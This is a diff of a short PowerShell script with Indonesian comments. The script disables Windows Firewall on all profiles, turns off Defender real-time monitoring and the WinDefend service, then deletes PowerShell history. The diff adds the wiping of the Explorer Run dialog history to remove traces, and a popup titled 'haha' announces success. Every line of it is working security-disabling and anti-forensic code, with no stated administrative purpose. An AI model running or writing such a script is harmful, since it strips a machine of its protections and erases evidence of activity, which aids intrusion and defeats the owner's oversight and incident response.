@@ -1,9 +1,7 @@
-# Harus dijalankan sebagai Administrator
-
-# Matikan Firewall dulu
+# Matikan Firewall
 netsh advfirewall set allprofiles state off
 
-# Nonaktifkan Realtime Protection (jika Defender aktif)
+# Nonaktifkan Realtime Protection
 try {
     Set-MpPreference -DisableRealtimeMonitoring $true
 } catch {
@@ -14,10 +12,13 @@ try {
 sc.exe stop WinDefend
 sc.exe config WinDefend start= disabled
 
-# Hapus history dari sesi saat ini
+# Notifikasi popup
+Add-Type -AssemblyName System.Windows.Forms
+[System.Windows.Forms.MessageBox]::Show("✅ Script berhasil dijalankan!", "haha", 'OK', 'Information')
+
+# Bersihkan jejak PowerShell
 Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
 Clear-History
 
-# Notifikasi berhasil
-Add-Type -AssemblyName System.Windows.Forms
-[System.Windows.Forms.MessageBox]::Show("✅ Script berhasil dijalankan!", "haha", 'mantap', 'Information')
+# Optional: Bersihkan Run history (semua!)
+Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name * -ErrorAction SilentlyContinue
